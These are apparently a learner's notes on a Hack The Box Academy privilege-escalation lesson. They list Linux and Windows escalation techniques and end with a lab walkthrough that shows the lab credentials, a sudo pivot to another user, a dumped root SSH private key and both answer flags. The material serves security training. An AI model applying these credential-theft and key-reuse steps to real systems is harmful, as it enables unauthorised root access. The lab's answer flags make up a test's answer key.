# Privilege Escalation
Our initial access to a remote server is usually in the context of a low-privileged user, which would not give us complete access over the box. To gain full access, we will need to find an internal/local vulnerability that would escalate our privileges to the root user on Linux or the administrator/SYSTEM user on Windows. Let us walk through some common methods of escalating our privileges.

## PrivEsc Checklists
[HackTricks](https://book.hacktricks.xyz/welcome/readme)
* [Linux](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
* [Windows](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
* [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

## Enumeration Scripts
Automating many of the above commands. But create a lot of noise, that could be detected.

Linux
* [LinEnum](https://github.com/rebootuser/LinEnum)
* [Linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

Windows
* [Seatbelt](https://github.com/GhostPack/Seatbelt)
* [JAWS](https://github.com/411Hall/JAWS)

[PEASS](https://github.com/carlospolop/PEASS-ng) (contains both):
* [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
* [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

## Kernel Exploits
Take a look at the kernel version and search for exploits. The version could be outdated. An easy Google search or lookup with `searchsploit` can help. The `uname` command will help to get the kernel version. As well, it shows the date of the kernel compilation. This gives a hint on how old is the kernel version.

Windows systems can run older versions as well. Kernel exploits could cause system damage!

## Vulnerable Software
Installed software may also be outdated and may contain vulnerabilities that we can exploit. `dpkg -l` lists the installed packages on Linux. In Windows, we can take a look at `C:\Program Files` to see installed sofware.

## User Privileges
We should also look for the privileges of the user. Maybe we are allowed to run commands as a different user or even as root. This could cause privilege escalation to the root user on a Linux system or to the system user on a Windows system. Common ways to exploit privileges are:
1. Sudo
2. SUID
3. Windows Token Privileges

`sudo` allows a Linux user to run commands as different user. This could be used to run commands as root user. We can list the sudo privileges with:
```
sudo -l
```

If a sudo rule contains a `NOPASSWD` means that we don't need a password to run the command. Otherwise we would need the users password.

If we have specific sudo rights, we can check for example at [GTFOBins](https://gtfobins.github.io/) if there are any exploits to escalate our privileges with that command.

On Windows systems we can check [LOLBAS](https://lolbas-project.github.io/#) for applications that could be used to run functions as a privileged user.

## Scheduled Tasks
Linux and Windows systems have methods to run commands or scripts at specific intervals. On Linux those are called cron jobs and on Windows scheduled tasks.

Those jobs or tasks can also be run as a privileged user. So maybe we are able to trick them to execute malicious software with escalated privileges. As well, we should check if we have the rights to add new ones.

In Linux we should check the following paths for write permissions:
1. `/etc/crontab`
2. `/etc/cron.d`
3. `/var/spool/cron/crontabs/root`

## Exposed Credentials
Another step is to look for files that could contain any credentials. For examples configuration (often database configs) or log files. Also, the bash history on Linux systems and the PSReadLine on Windows are worth taking a look inside.

The mentioned enumeration scripts will also search for those files.

If we find some credentials we should also keep in mind that many users reuse passwords.

## SSH Keys
In the `.ssh` folder in the home directory on Linux users are ssh keys stored. If we can access the folder we could find a private key which could lead to ssh access to the system.

If we have write access to the folder, we can also add our own public key to the `.ssh/authorized_keys` file to get ssh access to that user. To generate a ssh key we can use the command `ssh-keygen`. If we can write our key to the root user, we could log in as that user.

## Questions
Answer the question(s) below to complete this Section and earn cubes!

```
Target: 94.237.59.185:44768 
Life Left: 89 minutes
```

 SSH to `94.237.59.185` with user `user1` and password `password1`

SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.
```
> HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
```

```
┌──(kali㉿kali)-[~]
└─$ ssh user1@94.237.59.185 -p
(user1@94.237.59.185) Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.10.0-18-amd64 x86_64)

[...]

user1@ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:~$ id
uid=1000(user1) gid=1000(user1) groups=1000(user1)
user1@ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:~$ sudo -l
Matching Defaults entries for user1 on ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:
    (user2 : user2) NOPASSWD: /bin/bash
user1@ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:~$ sudo -u user2 /bin/bash
user2@ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:/home/user1$ id
uid=1001(user2) gid=1001(user2) groups=1001(user2)
user2@ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:/home/user1$ cat ../user2/flag.txt 
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
user2@ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:/home/user1$ 
```

Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.
```
> HTB{pr1v1l363_35c4l4710n_2_r007}
```

The user has access rights into the home directory from the root user. As well, we can read out the ssh key of the user:
```
user2@ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:~$ ls -al /root/
total 32
drwxr-x--- 1 root user2 4096 Feb 12  2021 .
drwxr-xr-x 1 root root  4096 Oct 17 16:11 ..
-rwxr-x--- 1 root user2    5 Aug 19  2020 .bash_history
-rwxr-x--- 1 root user2 3106 Dec  5  2019 .bashrc
-rwxr-x--- 1 root user2  161 Dec  5  2019 .profile
drwxr-x--- 1 root user2 4096 Feb 12  2021 .ssh
-rwxr-x--- 1 root user2 1309 Aug 19  2020 .viminfo
-rw------- 1 root root    33 Feb 12  2021 flag.txt
user2@ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:~$ ls -al /root/.ssh/
total 20
drwxr-x--- 1 root user2 4096 Feb 12  2021 .
drwxr-x--- 1 root user2 4096 Feb 12  2021 ..
-rw------- 1 root root   571 Feb 12  2021 authorized_keys
-rw-r--r-- 1 root root  2602 Feb 12  2021 id_rsa
-rw-r--r-- 1 root root   571 Feb 12  2021 id_rsa.pub
user2@ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:~$ cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
user2@ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:~$ 
```

We can copy that key and log in via ssh as root user:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/htb_academy]
└─$ ssh -i key root@94.237.59.185 -p 44768     

[...]

root@ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:~# cat flag.txt 
HTB{pr1v1l363_35c4l4710n_2_r007}
root@ng-832016-gettingstartedprivesc-qsy8w-7fd66f9967-lx8v7:~# 
```